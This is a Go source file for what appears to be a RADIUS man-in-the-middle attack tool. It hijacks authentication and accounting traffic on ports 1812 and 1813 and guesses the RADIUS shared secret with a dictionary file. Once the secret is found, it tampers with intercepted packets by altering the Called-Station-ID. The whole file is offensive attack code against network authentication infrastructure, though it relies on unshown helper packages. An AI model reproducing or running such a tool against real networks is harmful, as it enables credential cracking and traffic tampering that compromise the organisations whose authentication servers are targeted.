package main

import (
	"flag"
	"fmt"
	"net"
	"radius/radius"
	"radius/session"
)

const authPort = 1812
const accPort = 1813

const hostName = "169.254.63.10"

func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UDPAddr, clientToServer bool) bool {

	var client, server net.UDPAddr

	//Determine client and server
	if clientToServer {
		client = from
		server = to
	} else {
		client = to
		server = from
	}

	context := session.GetContextByClient(client)

	status := context.GetSecretStatus()

	switch status {
	case session.SecretUnknown:
		fmt.Println("No secret")
		fmt.Println("Determine secret")
		session.GuessSecret(*manglePacket, client, server, clientToServer)
	case session.SecretOk:

		ok, sta := manglePacket.GetCalledSTAID()

		if ok {
			fmt.Println("Called Sta", sta)
			sta += "MOD"
			manglePacket.SetCalledSTAID(sta)

			//Modify message authenticator attribute
		}

	}

	fmt.Println("Pck rcv from ", from, "to", to)

	fmt.Println("Code:", manglePacket.GetCode())
	fmt.Println("Id:", manglePacket.GetId())

	return true

}

func main() {

	secrets := flag.String("secrets", "secrets.txt", "Secrets file to perform dictionary attacks")

	flag.Parse()

	session.SetConfig(*secrets)

	//Init session
	var mySession session.Session

	mySession.Init(session.Active, hostName, authPort, accPort)

	mySession.Hijack(manglePacket)
}
